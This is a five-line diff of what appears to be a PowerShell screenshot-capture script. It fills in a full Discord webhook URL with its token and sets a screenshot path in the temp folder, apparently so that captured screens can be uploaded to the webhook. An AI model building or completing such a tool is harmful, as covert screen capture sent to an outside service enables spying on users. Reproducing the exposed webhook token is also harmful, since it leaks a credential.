@@ -1,5 +1,5 @@
 # 1. Configuration
-$WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+$WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
 $SCREENSHOT_PATH = "$env:TEMP\s.png"
 
 # 2. Capture Screenshot
